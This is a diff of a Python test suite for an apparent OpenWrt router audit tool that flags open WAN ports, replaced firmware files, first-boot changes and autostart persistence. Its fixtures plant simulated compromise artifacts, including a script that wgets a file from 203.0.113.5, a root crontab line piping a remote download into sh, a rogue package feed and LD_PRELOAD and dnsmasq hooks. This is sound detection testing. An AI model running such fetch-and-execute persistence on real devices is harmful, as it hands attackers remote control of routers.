@@ -271,11 +271,149 @@ sleep 1
             self.sh("uci delete uhttpd.main.no_ubusauth && uci commit uhttpd")
 
 
+class TestAuditZones(AuditCase):
+    """Which zone is the WAN side, and which sockets it reaches (real router: a Tailscale
+    zone with input=ACCEPT and masquerading was taken for the WAN zone)."""
+
+    SETUP = rf"""
+set -e
+{SET_ROOT_PW}
+uci set firewall.tailscale0=zone
+uci set firewall.tailscale0.name=tailscale0
+uci set firewall.tailscale0.input=ACCEPT
+uci set firewall.tailscale0.masq=1
+uci add_list firewall.tailscale0.device=lo
+{WAN_ZONE}
+uci add_list "$z.device=eth0"
+uci add firewall rule >/dev/null
+uci set firewall.@rule[-1].name='Allow-Test'
+uci set firewall.@rule[-1].src='wan'
+uci set firewall.@rule[-1].proto='tcp'
+uci set firewall.@rule[-1].dest_port='18090-18092'
+uci set firewall.@rule[-1].target='ACCEPT'
+uci commit firewall
+ip=$(ip -o -4 addr show dev eth0 | awk '{{ sub(/\/.*/, "", $4); print $4; exit }}')
+echo "$ip" > /tmp/eth0.ip
+(uhttpd -f -p 0.0.0.0:18090 -h /www >/dev/null 2>&1 &)
+(uhttpd -f -p 127.0.0.1:18091 -h /www >/dev/null 2>&1 &)
+(uhttpd -f -p "$ip:18092" -h /www >/dev/null 2>&1 &)
+sleep 1
+"""
+
+    def test_vpn_zone_is_not_the_wan_zone(self):
+        ip = self.sh("cat /tmp/eth0.ip").strip()
+        text, found = self.audit(ROM, categories=["exposure"])
+        self.assertNotIn("exposure.wan_input_accept", found)
+        self.assertNotIn("tailscale0", text)
+        # reachable from the WAN zone: bound to all addresses or to an address of its device
+        self.assertFinding(found, "exposure.wan_open_port", "MEDIUM", "tcp 0.0.0.0:18090 pid ",
+                           f"tcp {ip}:18092 pid ", "<- rule 'Allow-Test'")
+        block = found["exposure.wan_open_port"][1]
+        self.assertNotIn("127.0.0.1", block)  # an address of lo, which is not a WAN device
+        self.assertRegex(block, r"confidence: medium: read from /etc/config/firewall and the socket table; the loaded")
+
+    def test_zone_on_the_default_route_device_is_a_wan_zone(self):
+        ip = self.sh("cat /tmp/eth0.ip").strip()
+        self.sh(f"""{WAN_ZONE}
+            uci delete "$z.device"
+            uci set firewall.uplink=zone
+            uci set firewall.uplink.name=uplink
+            uci set firewall.uplink.input=ACCEPT
+            uci add_list firewall.uplink.device=eth0
+            uci commit firewall""")
+        try:
+            _, found = self.audit(ROM, categories=["exposure"])
+            self.assertFinding(found, "exposure.wan_input_accept", "HIGH", "zone 'uplink'", "devices: eth0",
+                               "reachable: tcp 0.0.0.0:18090", f"reachable: tcp {ip}:18092")
+            self.assertNotIn("127.0.0.1", found["exposure.wan_input_accept"][1])
+            self.assertNotIn("tailscale0", found["exposure.wan_input_accept"][1])
+        finally:
+            self.sh(f"""{WAN_ZONE}
+                uci delete firewall.uplink
+                uci add_list "$z.device=eth0"
+                uci commit firewall""")
+
+
+class TestAuditFirstBoot(AuditCase):
+    """What the firmware writes at its first boot is dated just after the newest file of
+    the image's /etc (the clock starts there). Fixture: that newest file is the banner
+    at 2026-06-01 12:00; first-boot files carry 12:07, a later change carries today.
+    ctime cannot be set in a container, so MCP_FIRSTBOOT_CTIME=0 judges by mtime alone;
+    with the ctime check on, a back-dated mtime must not hide anything."""
+
+    SETUP = MAKE_UPPER + rf"""
+touch -d '2026-06-01 12:00:00' {ROM_DIR}/etc/banner
+U={UPPER_DIR}
+mkdir -p $U/usr/sbin $U/lib/firmware
+# first boot: an image program rewritten, an image init script rewritten, a new file
+cp /bin/busybox $U/usr/sbin/odhcpd
+echo '# calibrated' >> /etc/init.d/sysntpd
+echo cal > $U/lib/firmware/e2p
+printf '#!/bin/sh\n' > /etc/hotplug.d/iface/30-vendor
+touch -d '2026-06-01 12:07:00' $U/usr/sbin/odhcpd /etc/init.d/sysntpd $U/lib/firmware/e2p /etc/hotplug.d/iface/30-vendor
+# later: the same kinds of change with today's date
+echo '/bin/ulogd &' >> /etc/init.d/urandom_seed
+printf '#!/bin/sh\n/tmp/up\n' > /etc/hotplug.d/iface/99-up
+"""
+    MTIME = dict(BOTH, MCP_FIRSTBOOT_CTIME="0")
+
+    def test_first_boot_changes_are_information(self):
+        text, found = self.audit(self.MTIME, categories=["integrity", "persistence"])
+        self.assertFinding(found, "integrity.first_boot_changes", "INFO",
+                           "/usr/sbin/odhcpd: changed by the firmware at first boot, mtime 2026-06-01 12:07:00",
+                           "/lib/firmware/e2p: created by the firmware at first boot")
+        self.assertRegex(found["integrity.first_boot_changes"][1],
+                         r"confidence: medium: mtime and ctime lie between 2026-06-01 12:00:00 and 2026-06-01 13:00:00, .*"
+                         r"system clock")
+        self.assertFinding(found, "persistence.first_boot_changes", "INFO",
+                           "/etc/init.d/sysntpd: changed by the firmware at first boot",
+                           "/etc/hotplug.d/iface/30-vendor: created by the firmware at first boot")
+        # the later changes stay findings
+        self.assertFinding(found, "integrity.image_file_replaced", "HIGH", "/usr/bin/jshn")
+        self.assertNotIn("odhcpd", found["integrity.image_file_replaced"][1])
+        self.assertFinding(found, "persistence.image_script_changed", "HIGH", "/etc/init.d/urandom_seed")
+        self.assertNotIn("sysntpd", found["persistence.image_script_changed"][1])
+        self.assertFinding(found, "persistence.autostart_added", "MEDIUM", "/etc/hotplug.d/iface/99-up")
+        self.assertNotIn("30-vendor", found["persistence.autostart_added"][1])
+        self.assertNotIn("e2p", found.get("integrity.unowned_program", ("", ""))[1])
+
+    def test_a_back_dated_mtime_alone_does_not_hide_a_change(self):
+        # default: the ctime must lie in the window too, and here it is today's
+        _, found = self.audit(BOTH, categories=["integrity", "persistence"])
+        self.assertFinding(found, "integrity.image_file_replaced", "HIGH", "/usr/sbin/odhcpd", "/usr/bin/jshn")
+        self.assertFinding(found, "persistence.image_script_changed", "HIGH", "/etc/init.d/sysntpd")
+        self.assertNotIn("integrity.first_boot_changes", found)
+        self.assertNotIn("persistence.first_boot_changes", found)
+
+    def test_tools_show_the_window(self):
+        text = self.tool_ok("overlay_diff", self.MTIME)
+        self.assertIn("first boot: entries with mtime and ctime between 2026-06-01 12:00:00 and 2026-06-01 13:00:00", text)
+        self.assertRegex(text, r"P4 changed .* /usr/sbin/odhcpd  \[changed by the firmware at first boot;.*written at first boot\]")
+        text = self.tool_ok("persistence", self.MTIME, locations=["init"])
+        self.assertRegex(text, r"\[CHANGED\] /etc/init\.d/sysntpd .*; written at first boot\)")
+        self.assertNotRegex(text, r"urandom_seed .*written at first boot")
+
+    def test_no_window_while_the_clock_is_inside_it(self):
+        # a device whose clock still stands at the build time cannot tell the two apart
+        self.sh(f"touch {ROM_DIR}/etc/banner")
+        try:
+            text, found = self.audit(self.MTIME, categories=["integrity"])
+            self.assertNotIn("integrity.first_boot_changes", found)
+            self.assertNotIn("first boot: entries", self.tool_ok("overlay_diff", self.MTIME))
+        finally:
+            self.sh(f"touch -d '2026-06-01 12:00:00' {ROM_DIR}/etc/banner")
+
+
 class TestAuditIntegrity(AuditCase):
     SETUP = MAKE_UPPER + rf"""
 mkdir -p {PROC_DIR}/100 {PROC_DIR}/101 {PROC_DIR}/102 {PROC_DIR}/103 {PROC_DIR}/104 /tmp/run
-printf '#!/bin/sh\n' > /tmp/run/payload && chmod 755 /tmp/run/payload
+printf '#!/bin/sh\n# fetch\nwget -O /tmp/x http://203.0.113.5/x\n' > /tmp/run/payload && chmod 755 /tmp/run/payload
 echo data > /tmp/run/notes
+# what vendor firmware leaves on the RAM disk: executable data, a lock, an empty script
+mkdir -p /tmp/run/modem /tmp/lock
+echo '{{"apn":"internet"}}' > /tmp/run/modem/operator-config.json && chmod 755 /tmp/run/modem/operator-config.json
+echo 4711 > /tmp/lock/reload.lock && chmod 700 /tmp/lock/reload.lock
+printf '#!/bin/sh\n' > /tmp/run/hotplug.ipt && chmod 755 /tmp/run/hotplug.ipt
 cp /bin/busybox /usr/bin/planted
 ln -s /tmp/run/payload {PROC_DIR}/100/exe
 ln -s /usr/bin/planted {PROC_DIR}/101/exe
@@ -290,8 +428,14 @@ printf 'HOME=/\000LD_PRELOAD=/tmp/run/libhook.so\000' > {PROC_DIR}/103/environ
         text, found = self.audit(FULL, categories=["integrity"])
         self.assertFinding(found, "integrity.image_file_replaced", "HIGH", "/usr/bin/jshn")
         self.assertFinding(found, "integrity.setuid_added", "HIGH", "/bin/ubus: ", "mode 4755", "image: mode 0755")
-        self.assertFinding(found, "integrity.unowned_program", "MEDIUM", "/usr/bin/gl-helper")
+        self.assertFinding(found, "integrity.unowned_program", "MEDIUM", "/usr/bin/gl-helper", "/usr/bin/stray")
         block = found["integrity.unowned_program"][1]
+        self.assertNotIn("/usr/bin/login", block)  # a link to an unchanged image program
+        self.assertNotIn("/usr/bin/awk", found["integrity.image_file_replaced"][1])  # same link target
+        self.assertNotIn("os-release", found["integrity.image_file_replaced"][1])  # not a program
+        self.assertFinding(found, "integrity.image_data_changed", "LOW", "/usr/lib/os-release")
+        self.assertIn("legitimate if you updated them yourself", found["integrity.image_file_replaced"][1])
+        self.assertNotIn("treat the router as compromised", text)
         self.assertNotIn("notes.txt", block)  # not executable: priority 3, no finding
         self.assertNotIn("gl_helper", block)  # an autostart entry: the persistence checks own it
         self.assertNotIn("/etc/config/firewall", text)
@@ -299,12 +443,24 @@ printf 'HOME=/\000LD_PRELOAD=/tmp/run/libhook.so\000' > {PROC_DIR}/103/environ
         if "/usr/sbin/uhttpd" in self.tool_ok("overlay_diff", BOTH, status="deleted"):
             self.assertFinding(found, "integrity.image_file_deleted", "LOW", "/usr/sbin/uhttpd: deleted in the overlay")
             self.assertNotIn("uci-defaults", found["integrity.image_file_deleted"][1])
+            self.assertNotIn("/etc/rc.d/", found["integrity.image_file_deleted"][1])  # a disabled service
 
     def test_tmp_executables(self):
         _, found = self.audit(FULL, categories=["integrity"])
-        self.assertFinding(found, "integrity.tmp_executable", "MEDIUM", "/tmp/run/payload: script (#!/bin/sh)")
+        self.assertFinding(found, "integrity.tmp_executable", "LOW", "/tmp/run/payload: script (#!/bin/sh)")
         block = found["integrity.tmp_executable"][1]
         self.assertNotIn("/tmp/run/notes", block)
+        # executable data files and a script without a command are not programs
+        for noise in ("operator-config.json", "reload.lock", "hotplug.ipt"):
+            self.assertNotIn(noise, block)
+        self.sh("cp /bin/busybox /tmp/run/dropper && chmod 755 /tmp/run/dropper")
+        try:
+            _, found = self.audit(FULL, categories=["integrity"])
+            self.assertFinding(found, "integrity.tmp_executable", "MEDIUM", "/tmp/run/dropper: ELF program",
+                               "/tmp/run/payload: script")
+        finally:
+            self.sh("rm -f /tmp/run/dropper")
+        block = found["integrity.tmp_executable"][1]
         self.assertNotIn(UPPER_DIR, block)  # the overlay under inspection is not "the RAM disk"
         self.assertNotIn("openwrt-mcp", block)
 
@@ -333,6 +489,28 @@ printf 'HOME=/\000LD_PRELOAD=/tmp/run/libhook.so\000' > {PROC_DIR}/103/environ
             self.sh("rm -f /etc/ld.so.preload")
         _, found = self.audit(BOTH, categories=["integrity"])
         self.assertNotIn("integrity.ld_preload", found)
+
+    def test_procd_preload_of_an_image_library_is_normal(self):
+        # procd preloads /lib/libsetlbf.so into services that log their stdout
+        env = dict(BOTH, MCP_PROC="/fixture/proc2")
+        self.sh("mkdir -p /fixture/proc2/200 && echo dnsproxy > /fixture/proc2/200/comm && "
+                "ln -s /bin/busybox /fixture/proc2/200/exe && printf 'dnsproxy\\000' > /fixture/proc2/200/cmdline && "
+                "printf 'PATH=/bin\\000LD_PRELOAD=/lib/libsetlbf.so\\000' > /fixture/proc2/200/environ")
+        text, found = self.audit(env, categories=["integrity"])
+        self.assertNotIn("integrity.ld_preload", found)
+        self.assertNotIn("pid 200", text)
+        # without an image it cannot be verified: not a finding, but said
+        text, found = self.audit({"MCP_PROC": "/fixture/proc2"}, categories=["integrity"])
+        self.assertNotIn("integrity.ld_preload", found)
+        self.assertRegex(text.split("== Could not check")[1], r"integrity\.ld_preload: 1 processes preload /lib/libsetlbf\.so")
+        # the same name with other content than the image is a finding again
+        self.sh("cp -a /lib/libsetlbf.so /tmp/libsetlbf.bak && echo x >> /lib/libsetlbf.so")
+        try:
+            _, found = self.audit(env, categories=["integrity"])
+            self.assertFinding(found, "integrity.ld_preload", "HIGH",
+                               "pid 200 (dnsproxy): environment has LD_PRELOAD=/lib/libsetlbf.so")
+        finally:
+            self.sh("cp -a /tmp/libsetlbf.bak /lib/libsetlbf.so")
 
     def test_kernel_modules(self):
         mods = self.sh("awk '{ print $1 }' /proc/modules").split()
@@ -369,6 +547,17 @@ printf '#!/bin/sh\n/tmp/.cache/up\n' > /etc/hotplug.d/iface/99-up
 ln -s ../init.d/dnsmasq /etc/rc.d/S99again
 echo '*/5 * * * * wget -qO- http://203.0.113.5/x?token=crontoken9 | sh' > /etc/crontabs/root
 printf '# comment\n/usr/bin/ddns-update\nexit 0\n' > /etc/rc.local
+# not autostart: crond's marker file, dnsmasq's runtime conf-dir with plain upstream
+# lines, a server= line added to dnsmasq.conf, a dhcp-script that is an image program
+echo root > /etc/crontabs/cron.update
+mkdir -p /tmp/dnsmasq.d /usr/share/nftables.d/ruleset-post
+printf 'server=/ts.net/100.100.100.100\nipset=/example.org/vpn\n' > /tmp/dnsmasq.d/upstream.conf
+echo 'dhcp-script=/usr/lib/dnsmasq/dhcp-script.sh' > /tmp/dnsmasq.d/stats.conf
+echo 'server=/corp.example/10.0.0.53' >> /etc/dnsmasq.conf
+# autostart through dnsmasq: a program of its own on every lease
+echo 'dhcp-script=/tmp/.cache/lease.sh' > /tmp/dnsmasq.d/hook.conf
+# nft rules are loaded at every firewall reload, but cannot run a program
+echo 'tcp dport 53 drop' > /usr/share/nftables.d/ruleset-post/dns_drop.nft
 echo 'src/gz evil http://203.0.113.9/packages' >> /etc/opkg/customfeeds.conf 2>/dev/null || echo 'http://203.0.113.9/packages' >> /etc/apk/repositories.d/customfeeds.list
 cat > /etc/config/wireless <<'EOF'
 config wifi-device 'radio0'
@@ -429,6 +618,18 @@ EOF
                            "/etc/rc.local line 2: /usr/bin/ddns-update")
         self.assertNotIn("crontoken9", text)
         self.assertNotIn("exit 0", found["persistence.user_autostart"][1])
+        self.assertNotIn("cron.update", text)
+        self.assertNotIn("dnsmasq", found["persistence.user_autostart"][1])
+        self.assertNotIn("dnsmasq", found["persistence.autostart_added"][1])
+        self.assertNotIn(".nft", found["persistence.autostart_added"][1])
+        self.assertFinding(found, "persistence.dnsmasq_hook", "MEDIUM",
+                           "/tmp/dnsmasq.d/hook.conf line 1: dhcp-script=/tmp/.cache/lease.sh")
+        self.assertEqual(found["persistence.dnsmasq_hook"][1].count("    - "), 1)  # not the image's dhcp-script.sh
+        self.assertNotIn("upstream.conf", text)
+        self.assertNotIn("corp.example", text)
+        self.assertFinding(found, "persistence.firewall_rules_added", "LOW", "ruleset-post/dns_drop.nft")
+        self.assertIn("legitimate if you edited them yourself", found["persistence.image_script_changed"][1])
+        self.assertNotIn("treat the router as compromised", text)
         self.assertFinding(found, "persistence.feeds_changed", "LOW", "customfeeds")
 
     def test_persistence_without_image(self):
